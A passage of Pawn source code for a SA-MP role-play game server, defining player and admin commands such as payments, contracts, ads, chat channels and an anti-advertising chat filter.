		}
		if(PlayerInfo[playerid][pAdmin] == 12)
		{
			format(string, sizeof(string), "(( Web Developer %s: %s ))", sendername, text);
			SendClientMessageToAll(COLOR_BLUE, string);
		}

		if(PlayerInfo[playerid][pAdmin] == 11)
		{
			format(string, sizeof(string), "(( Host Provider %s: %s ))", sendername, text);
			SendClientMessageToAll(COLOR_BLUE, string);
		}
		if(PlayerInfo[playerid][pAdmin] == 10)
		{
			format(string, sizeof(string), "(( Manager %s: %s ))", sendername, text);
			SendClientMessageToAll(COLOR_BLUE, string);
		}
		if(PlayerInfo[playerid][pAdmin] == 9)
		{
			format(string, sizeof(string), "(( Hoster++ RPG %s: %s ))", sendername, text);
			SendClientMessageToAll(COLOR_BLUE, string);
		}
		if(PlayerInfo[playerid][pAdmin] == 8)
		{
			format(string, sizeof(string), "(( Hoster+  %s: %s ))", sendername, text);
			SendClientMessageToAll(COLOR_BLUE, string);
		}
		else if(PlayerInfo[playerid][pAdmin] == 7)
		{
			format(string, sizeof(string), "(( Hoster  %s: %s ))", sendername, text);
			SendClientMessageToAll(COLOR_BLUE, string);
		}
		if(PlayerInfo[playerid][pAdmin] == 6)
		{
			format(string, sizeof(string), "(( Supervisor %s: %s ))", sendername, text);
			SendClientMessageToAll(COLOR_BLUE, string);
		}
		if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pAdmin] <= 5)
		{
			format(string, sizeof(string), "(( Admin %s: %s ))", sendername, text);
			SendClientMessageToAll(COLOR_BLUE, string);
		}
	}
	return 1;
}
CMD:count(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
	    new sendername[30],range,string[256],count=0;
	    if(sscanf(params, "i", range)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/count <Range>");
	    {
     		GetPlayerName(playerid, sendername, sizeof(sendername));
 			if(countdown == 0)
    		{
    			foreach(Player,i)
    			{
 		    		if(IsPlayerConnected(i))
					{
	    				if(ProxDetectorS(range, playerid, i))
				    	{
							SetTimerEx("CountDownCheck3", 1000, 0, "i", i);
							SetTimer("CountDownFinalize", 5000, 0);
   							countdown = 1;
   							count++;
						}
					}
				}
				format(string,sizeof(string),"{C1F589}Admin %s has started the countdown for %d players(range: %d).",sendername,count,range);
				ABroadCast(COLOR_SERVER, string,1);
			}
			else return SendClientMessage(playerid,COLOR_SERVER, "Countdown is already started.");
		}
	}
	else return SendClientMessage(playerid,COLOR_ERROR, AdminOnly);
	return 1;
}
CMD:fastevent(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
		if(PlayerInfo[playerid][pAdmin] >= 1)
		{
		    new mesaj[30],string[MAX_STRING],sendername[30];
		    GetPlayerName(playerid, sendername, sizeof(sendername));
		    if(sscanf(params, "s[30]",mesaj)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/fastevent <FastMessage[3-30 characters]>");
		    if(strlen(mesaj) > 2 && strlen(mesaj) <= 30)
		    {
		        format(string, sizeof(string), "Fast Event: {FFFFFF}%s organizes an event fast.", sendername);
			    OOCNews(COLOR_ERROR, string);
			    format(string, sizeof(string), "Fast Event: {FFFFFF}First to {FF6347}'%s' {FFFFFF}receives between 1,000$ and 20,000$.", mesaj);
			    OOCNews(COLOR_ERROR, string);
			    FastString = mesaj;
			    Answered = 0;
			}
			else return SendClientMessage(playerid, COLOR_ERROR, "FastMessage must be between 3 and 30 characters.");
		}
		else return SendClientMessage(playerid,COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:contract(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
   	{
		new id,moneys,string[256],sendername[25],giveplayer[25];
		if(sscanf(params, "ui",id,moneys)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/contract <Name/Playerid> <Money>");
		if(moneys < 20000 || moneys > 1000000) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Contract money must be atleast $20,000, and not more then $1,000,000.");
		if(PlayerInfo[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You must be level 2 to place a Contract.");
	    if(id != INVALID_PLAYER_ID)
	    {
			if(PlayerInfo[id][pAdmin] > 0) return SCM(playerid,COLOR_SERVER,"{FFB870}Cannot place contracts on Admin.");
			if(PlayerInfo[id][pMember] == 11) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Cannot place Contracts on Agency.");
            if(PlayerInfo[playerid][pMember] == 11) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are Agency.");
		    if(IsACop(id) && moneys < 100000) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Only $100,000 can be placed as a Contract on Cops.");
		    if(id == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You cannot Contract yourself.");
			GetPlayerName(id, giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
			if(GetPlayerCash(playerid) >= moneys)
			{
				GivePlayerCash(playerid, -moneys);
				PlayerInfo[id][pHeadValue] += moneys;
				format(string, sizeof(string), "%s has placed a contract on %s, for $%s.",sendername, giveplayer, FormatNumber(moneys));
				SendFamilyMessage(11, COLOR_YELLOW, string);
				format(string, sizeof(string), "* You placed a contract on %s, for $%s.",giveplayer, FormatNumber(moneys));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				new str[184];
				Update(playerid, pCashx);
				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `HeadValue`='%d' WHERE `name`='%s'",PlayerInfo[id][pHeadValue],PlayerInfo[id][pNormalName]);
				mysql_tquery(SQL,str,"","");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Invalid transaction amount.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:pay(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new id,moneys,sendername[25],giveplayer[25],string[256];
		if(sscanf(params, "ui",id,moneys)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/pay <Name/Playerid> <Amount of Money>");
		if(moneys > 1000 && PlayerInfo[playerid][pLevel] < 5) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Nu poti transfera mai mult de $1,000 daca nu ai level 5.");
		if(moneys < 1 || moneys > 100000 && PlayerInfo[playerid][pPremiumAccount] < 1) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Nu ai cont premium pentru a transfera mai mult de $100.000.");
		if(moneys < 1 || moneys > 1000000 && PlayerInfo[playerid][pPremiumAccount] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Suma transferata poate fi intre $1 si $1,000,000.");
		if(id == playerid) return SCM(playerid,COLOR_SERVER,"{FFB870}You can not give one money.");
	    if(id != INVALID_PLAYER_ID)
	    {
	        if(payala[playerid] == 1) return 1;
			if (ProxDetectorS(5.0, playerid, id))
			{
				if(Spectate[id] != -1) return SCM(playerid,COLOR_SERVER,"{C1F589}This player is not near you.");
				GetPlayerName(id, giveplayer, sizeof(giveplayer));
				GetPlayerName(playerid, sendername, sizeof(sendername));
				new playermoney;
				playermoney = GetPlayerCash(playerid);
				if (moneys > 0 && playermoney >= moneys)
				{
				    SetTimerEx("payala2", 3000, 0, "i", playerid);
				    payala[playerid] = 1;
					GivePlayerCash(playerid, -moneys);
					GivePlayerCash(id, moneys);
					format(string, sizeof(string), "You have paid $%s to %s.",FormatNumber(moneys),giveplayer);
					SendClientMessage(playerid, COLOR_SERVER, string);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					format(string, sizeof(string), "%s has paid you $%s.",sendername,FormatNumber(moneys));
					SendClientMessage(id, COLOR_SERVER, string);
					PlayerPlaySound(id, 1052, 0.0, 0.0, 0.0);
					if(ofertazilei == 2 && PlayerInfo[playerid][pDailyBonus] == 1 && moneys >= 100000)
					{
						if(PlayerInfo[id][pLevel] <= 5)
						{
							PlayerInfo[playerid][pDailyBonus] = 0;
							new sqlupdate[1000];
							mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `DailyBonus`='0' WHERE `id` = '%d'",PlayerInfo[playerid][pSQLID]);
							mysql_tquery(SQL, sqlupdate, "","");
							SCM(playerid, COLOR_SERVER, "{0066FF}Daily Deals: {FFFFFF}You receive 30 Points Premium, 5 Points of Respect, $3,000,000 because you filled day offer.");
							GivePlayerCash(playerid, 3000000);
							PlayerInfo[playerid][pExp] += 5;
							PlayerInfo[playerid][pPremiumPoints] += 30;
							Update(playerid, pCashx);
							Update(playerid, pRP);
							Update(playerid, pPremiumPointsx);
						}
					}
					format(string, sizeof(string), "%s takes out $%s in cash, and hands it to %s.",sendername,FormatNumber(moneys),giveplayer);
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					new var100[256],y,m,d,h,mi,s,string2[256],string3[256];
					getdate(y,m,d);
					gettime(h,mi,s);
					format(string2,sizeof(string2),"[%02d-%02d-%d %02d:%02d:%02d] %s[user:%d] /pay $%s to %s[user:%d].",d,m,y,h,mi,s,sendername,PlayerInfo[playerid][pSQLID],FormatNumber(moneys),giveplayer,PlayerInfo[id][pSQLID]);
 					mysql_real_escape_string(string2, string3);
					mysql_format(SQL, var100, sizeof(var100), "INSERT INTO playerlogs (`playerid`,`giverid`,`action`,`time`) VALUES ('%d','%d','%s','%02d-%02d-%d %02d:%02d:%02d')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],string3,d,m,y,h,mi,s);
					mysql_tquery(SQL,var100,"","");
					Update(id, pCashx);
					Update(playerid, pCashx);
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Invalid transaction amount.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}This player is not near you.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:number(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pPhoneBook] == 1)
		{
			new id,string[128],sendername[25];
			if(sscanf(params, "u",id)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/number <Name/Playerid>");
		    if(id != INVALID_PLAYER_ID)
		    {
		        GetPlayerName(id, sendername, sizeof(sendername));
		        if(PlayerInfo[id][pPnumber] == 0)
		        {
					format(string, 256, "Name: {CECECE}%s {FFFFFF}| Number: {CECECE}None",sendername);
					SendClientMessage(playerid, COLOR_SERVER, string);
				}
				else
				{
				    format(string, 256, "Name: {CECECE}%s {FFFFFF}| Number: {CECECE}%d",sendername,PlayerInfo[id][pPnumber]);
					SendClientMessage(playerid, COLOR_SERVER, string);
				}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You do not have a PhoneBook.");
	}
	return 1;
}
CMD:togooc(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (!gOoc[playerid])
		{
			gOoc[playerid] = 1;
			SendClientMessage(playerid, COLOR_GRAD1, "OOC chat channel Disabled.");
		}
		else if (gOoc[playerid])
		{
			gOoc[playerid] = 0;
			SendClientMessage(playerid, COLOR_GRAD1, "OOC chat channel Enabled.");
		}
	}
	return 1;
}
CMD:tognews(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (!gNews[playerid])
		{
			gNews[playerid] = 1;
			SendClientMessage(playerid, COLOR_GRAD1, "News chat channel Disabled.");
		}
		else if (gNews[playerid])
		{
			gNews[playerid] = 0;
			SendClientMessage(playerid, COLOR_GRAD1, "News chat channel Enabled.");
		}
	}
	return 1;
}
CMD:togfam(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (!gFam[playerid])
		{
			gFam[playerid] = 1;
			SendClientMessage(playerid, COLOR_GRAD1, "Family chat channel Disabled.");
		}
		else if (gFam[playerid])
		{
			gFam[playerid] = 0;
			SendClientMessage(playerid, COLOR_GRAD1, "Family chat channel Enabled.");
		}
	}
	return 1;
}
CMD:togwhisper(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pPremiumAccount] == 1 || PlayerInfo[playerid][pAdmin] >= 1)
        {
			if (!HidePM[playerid])
			{
				HidePM[playerid] = 1;
				SendClientMessage(playerid, COLOR_GRAD1, "Whisper chat channel Disabled.");
			}
			else if (HidePM[playerid])
			{
				HidePM[playerid] = 0;
				SendClientMessage(playerid, COLOR_GRAD1, "Whisper chat channel Enabled.");
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Your are not admin or you don't have premium account.");
	}
	return 1;
}
CMD:togw(playerid, params[])
{
    return cmd_togwhisper(playerid, params);
}
CMD:changepass(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	ShowPlayerDialog(playerid, DIALOG_NEWPASS,DIALOG_STYLE_INPUT, "Change password:","Type in box your new password:","Done","Close");
	return 1;
}
CMD:me(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You havent logged in yet.");
		new string[250],result[250],sendername[25];
        if(PlayerInfo[playerid][pMuted] == 1)
        {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/me <Action>");
		format(string, sizeof(string), "(/me)* %s %s.", sendername, result);
		ProxDetector(12.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new resulttt[300],strr[300];
		format(strr, sizeof(strr),"(me) %s",result);
		mysql_real_escape_string(strr, resulttt);
		printf("%s", string);
	}
	return 1;
}
CMD:do(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You havent logged in yet.");
		new string[250],result[250],sendername[25];
        if(PlayerInfo[playerid][pMuted] == 1)
        {
			format(string, sizeof(string), "You Can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/do <Action>");
		format(string, sizeof(string), "* %s (( %s )) ", result, sendername);
		ProxDetector(12.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new resulttt[300],strr[300];
		format(strr, sizeof(strr),"(do) %s",result);
		mysql_real_escape_string(strr, resulttt);
		printf("%s", string);
	}
	return 1;
}
CMD:advertise(playerid, params[])
{
    return cmd_ad(playerid, params);
}
CMD:adtime(playerid, params[])
{
	if(secundepanalaad[playerid] > 0)
	{
	    format(MGLOBAL, sizeof(MGLOBAL), "Your ad will be published in %d seconds.",secundepanalaad[playerid]);
	    SCM(playerid, COLOR_YELLOW, MGLOBAL);
	}
	return 1;
}
CMD:ad(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "Please login server!");
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pPnumber] < 999) return SCM(playerid, COLOR_ERROR, "You have a valid phone number.");
        if(PlayerInfo[playerid][pCredits] < 1) return SCM(playerid, COLOR_ERROR, "Do not have enough phone credit, go buy a 24/7 and a credit voucher");
		new string[1000],sendername[30],message[1000],idx,adss=0;
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(AdvPlayer[playerid] != 0)
		{
			SendClientMessage(playerid, COLOR_SERVER, "Your ad:");
			SendClientMessage(playerid, COLOR_SERVER, AdvMSG[playerid]);
			SendClientMessage(playerid, COLOR_SERVER, "To delete your announcement, uses /deletemyad.");
			return 1;
		}
		if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_SERVER, "You don't have level 3.");
        if(!PlayerToPoint(5.0, playerid, BizzInfo[28][bEntranceX],BizzInfo[28][bEntranceY],BizzInfo[28][bEntranceZ]) && !PlayerToPoint(5.0, playerid, BizzInfo[52][bEntranceX],BizzInfo[52][bEntranceY],BizzInfo[52][bEntranceZ])) return SendClientMessage(playerid, COLOR_SERVER, "You are not near CNN.");
		if(PlayerInfo[playerid][pMuted] == 1)
        {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		if(sscanf(params, "s[1000]",message)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/ad <Message>");
		new length = strlen(params);
		while ((idx < length) && (params[idx] <= ' '))
		{
			idx++;
		}
		new offset = idx;
		new result[264];
		while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
		{
			result[idx - offset] = params[idx];
			idx++;
		}
		result[idx - offset] = EOS;
		new payout = idx * 150;
		if(GetPlayerCash(playerid) < payout) return SendClientMessage(playerid, COLOR_SERVER, "You do not have enough money.");
		GivePlayerCash(playerid, -payout);
		foreach(Player, i)
		{
			if(AdvPlayer[i] != 0)
			{
				adss++;
			}
		}
		if(adss >= 50) return SendClientMessage(playerid, COLOR_SERVER, "There are 50 ads placed, come back later.");
		strcpy(AdvMSG[playerid], message, 256);
		format(string, sizeof(string),"{3DA614}Ad by %s ({FFFFFF}%d{3DA614}): %s",sendername,playerid,message);
		foreach(Player, i)
		{
			if(PlayerInfo[i][pAdmin] > 0)
			{
				SendSplitMessage(i, COLOR_ADV, string);
			}
		}
		AdvPlayer[playerid] = 1;
		secundepanalaad[playerid] = 30;
        format(string, sizeof(string), "You paid $%d for posting. Your ad will appear in 30 seconds.", payout);
        SendClientMessage(playerid, COLOR_SERVER, string);
		new str[1000];
		if(IsPlayerInRangeOfPoint(playerid, 5.0,BizzInfo[28][bEntranceX],BizzInfo[28][bEntranceY],BizzInfo[28][bEntranceZ]))
		{
			BizzInfo[28][bTill] += payout;
			mysql_format(SQL,str,128,"UPDATE bizz SET `Till`='%d' WHERE `ID`='28'",BizzInfo[28][bTill]);
			mysql_tquery(SQL,str,"","");
		}
		else if(IsPlayerInRangeOfPoint(playerid, 5.0,BizzInfo[52][bEntranceX],BizzInfo[52][bEntranceY],BizzInfo[52][bEntranceZ]))
		{
			BizzInfo[52][bTill] += payout;
			mysql_format(SQL,str,128,"UPDATE bizz SET `Till`='%d' WHERE `ID`='52'",BizzInfo[52][bTill]);
			mysql_tquery(SQL,str,"","");
		}
	}
	return 1;
}
CMD:deletemyad(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(AdvPlayer[playerid] != 0)
		{
            secundepanalaad[playerid] = -1;
			AdvPlayer[playerid] = 0;
			format(AdvMSG[playerid], 256, "");
			SendClientMessage(playerid, COLOR_ERROR, "Your ad has been deleted.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "You don't have an ad placed.");
	}
	return 1;
}
CMD:dad(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(PlayerInfo[playerid][pAdmin] > 0)
		{
			new id,string[256],sendername[30],giveplayer[30];
			if(sscanf(params, "u",id)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/dad <Name/Playerid>");
			if(IsPlayerConnected(id))
			{
				if(AdvPlayer[id] != 0)
				{
					GetPlayerName(playerid, sendername, sizeof(sendername));
					GetPlayerName(id, giveplayer, sizeof(giveplayer));
					secundepanalaad[id] = -1;
					AdvPlayer[id] = 0;
					format(AdvMSG[id], 256, "");
					format(string, sizeof(string),"Admin %s deleted %s /ad.",sendername,giveplayer);
					ABroadCast(COLOR_ADMCOMMANDS,string,1);
					format(string, sizeof(string),"Admin %s deleted your /ad.",sendername);
					SendClientMessage(playerid, COLOR_ERROR, string);
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "This player don't have an ad placed.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:shout(playerid, params[])
{
    return cmd_s(playerid, params);
}
CMD:s(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		new string[250],result[250],sendername[25];
	    if(PlayerInfo[playerid][pMuted] == 1)
        {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/s(hout) <Message>");
		format(string, sizeof(string), "%s shouts: %s!", sendername, result);
		ProxDetector(30.0, playerid, string,COLOR_SERVER,COLOR_SERVER,COLOR_SERVER,COLOR_FADE1,COLOR_FADE2);
		format(string, sizeof(string), "(shouts) \"%s!\"", params);
		SetPlayerChatBubble(playerid, string, COLOR_CHATBUBBLE, 30.0, 10000);
		new resulttt[300],strr[300];
		format(strr, sizeof(strr),"(shouts) %s",result);
		mysql_real_escape_string(strr, resulttt);
		if(FindIP(result))
	    {
			format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /s.", sendername,playerid,result);
			ABroadCast(COLOR_SERVER,string,1);
	    }
	    for(new d; d<sizeof(TLD); d++)
		{
		    if(strfind(result,TLD[d],true) != -1 )
		    {
				if(strfind(result, "wwww.Magic-Gaming.tk", true) != -1 || strfind(result, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(result, "Magic-Gaming.tk", true) != -1) break;
				format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /s.", sendername,playerid,result);
				ABroadCast(COLOR_SERVER,string,1);
			}
		}
		for(new adm = 0; adm<=MAX_PLAYERS;adm++)
		{
			if(IsPlayerConnected(adm))
			{
				if(PlayerInfo[adm][pAdmin] > 0 && BigEar[adm] == 1)
 				{
 					format(string, sizeof(string), "%s shouts: %s!",sendername,result);
					SendClientMessage(adm,  COLOR_YELLOW, string);
 				}
			}
		}
		printf("%s", string);
	}
	return 1;
}
CMD:b(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You havent logged in yet.");
		new string[250],result[250],sendername[25];
	    if(PlayerInfo[playerid][pMuted] == 1)
        {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/b <Message>");
		format(string, sizeof(string), "%s says: (( %s ))", sendername, result);
		ProxDetector(35.0, playerid, string,COLOR_SERVER,COLOR_SERVER,COLOR_SERVER,COLOR_FADE1,COLOR_FADE2);
		new resulttt[300],strr[300];
		format(strr, sizeof(strr),"(( %s ))",result);
		mysql_real_escape_string(strr, resulttt);
		if(FindIP(result))
	    {
			format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /b.", sendername,playerid,result);
			ABroadCast(COLOR_SERVER,string,1);
	    }
	    for(new d; d<sizeof(TLD); d++)
		{
		    if(strfind(result,TLD[d],true) != -1 )
		    {
				if(strfind(result, "wwww.Magic-Gaming.tk", true) != -1 || strfind(result, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(result, "Magic-Gaming.tk", true) != -1) break;
				format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /b.", sendername,playerid,result);
				ABroadCast(COLOR_SERVER,string,1);
			}
		}
		for(new adm = 0; adm<=MAX_PLAYERS;adm++)
		{
			if(IsPlayerConnected(adm))
			{
				if(PlayerInfo[adm][pAdmin] > 0 && BigEar[adm] == 1)
 				{
 					format(string, sizeof(string), "%s says: (( %s ))",sendername,result);
					SendClientMessage(adm,  COLOR_YELLOW, string);
 				}
			}
		}
		printf("%s", string);
	}
	return 1;
}
CMD:low(playerid,params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You havent logged in yet.");
		new string[250],result[250],sendername[25];
	    if(PlayerInfo[playerid][pMuted] == 1)
        {
			format(string, sizeof(string), "You can not speak, you have been silenced for %d seconds.",PlayerInfo[playerid][pMuteTime]);
			SendClientMessage(playerid, COLOR_ERROR, string);
			return 1;
		}
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(sscanf(params, "s[250]",result)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/low <Message>");
		if(FindIP(result)) /// Anti-Reclama
        {
	        new advertiser[MAX_PLAYER_NAME];
	        GetPlayerName(playerid, advertiser, sizeof(advertiser));
	        format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /low.", advertiser, playerid, result);
			ABroadCast(COLOR_SERVER,string,1);
        }
        for(new i; i < sizeof(TLD); i++)
		{
			if(strfind(result, TLD[i], true) != -1)
			{
				if(strfind(result, "wwww.Magic-Gaming.tk", true) != -1 || strfind(result, "wwww.Magic-Gaming.tk/forum", true) != -1 || strfind(result, "Magic-Gaming.tk", true) != -1) break;
				new advertiser[MAX_PLAYER_NAME];
				GetPlayerName(playerid, advertiser, sizeof(advertiser));
				format(string, sizeof(string), "{ba9789}Warning: %s(%d) typed %s in /low.", advertiser, playerid, result);
				ABroadCast(COLOR_SERVER,string,1);
			}
		}
		format(string, sizeof(string), "%s says quietly: %s", sendername, result);
		ProxDetector(3.0, playerid, string,COLOR_SERVER,COLOR_SERVER,COLOR_SERVER,COLOR_FADE1,COLOR_FADE2);
		format(string, sizeof(string), "(quietly) \"%s\"", params);
		SetPlayerChatBubble(playerid, string, COLOR_CHATBUBBLE, 3.0, 10000);
		new resulttt[300],strr[300];
		format(strr, sizeof(strr),"(quietly) %s",result);
		mysql_real_escape_string(strr, resulttt);

		for(new adm = 0; adm<=MAX_PLAYERS;adm++)
		{
			if(IsPlayerConnected(adm))
			{
				if(PlayerInfo[adm][pAdmin] > 0 && BigEar[adm] == 1)
 				{
 					format(string, sizeof(string), "%s says quietly: %s",sendername,result);
					SendClientMessage(adm,  COLOR_YELLOW, string);
 				}
			}
		}
		printf("%s", string);
	}
	return 1;
}
CMD:sethirecar(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
		if (PlayerInfo[playerid][pAdmin] >= 5)
		{
			new car,string[64];
			if(sscanf(params, "d",car)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/hirecar <Car ID>");
			HireCar[playerid] = car;
			format(string, sizeof(string), "Key fashioned you can lock car %d.",car);
			SendClientMessage(playerid, COLOR_GRAD1, string);
			SendClientMessage(playerid, COLOR_SERVER, "HINT: Type /lock.");
			return 1;
		}
	}
	return 1;
}
CMD:fish(playerid,params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pJob] != 13) return SCM(playerid,COLOR_SERVER,"{FFB870}You are not a fisherman.");
